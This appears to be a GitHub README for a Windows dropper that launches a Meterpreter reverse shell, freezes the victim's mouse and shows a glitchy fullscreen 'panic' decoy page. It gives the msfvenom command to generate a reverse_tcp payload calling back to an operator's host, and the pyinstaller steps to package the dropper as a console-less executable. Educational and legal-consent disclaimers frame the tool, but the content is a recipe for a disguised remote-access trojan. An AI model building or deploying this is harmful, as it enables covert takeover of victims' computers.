# windows-html-decoy-payload
meterpreter payload with HTML decoy site, more advanced

("html_decoy_preview.mp4" is a preview/example of the html-decoy)

Windows HTML Decoy + Payload Dropper

This educational repo demonstrates a Windows payload launcher that:
- Executes a Meterpreter reverse shell
- Freezes the user's mouse for 10 seconds
- Opens a **glitchy, red, fullscreen HTML decoy** with dramatic imagery

For security researchers and red team simulation **only**. 
Using this tool outside of a controlled virtual environment
without legal consent is **ILLEGAL**

---

 Setup & Usage

1. Generate the Reverse Shell

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -f exe -o shell.exe
```

2. Place `shell.exe` in the `builder/` folder.

3. Build the Dropper (Python Required)

```bash
pip install pyinstaller
cd builder
pyinstaller --noconsole --onefile dropper.py
```

---

Legal

Do **NOT** use this on systems you don't own or without explicit permission.

---

Credits

- Payload launcher logic by Talyx66
- HTML glitch effects custom-crafted
- Image sources used in decoy for visual panic simulation
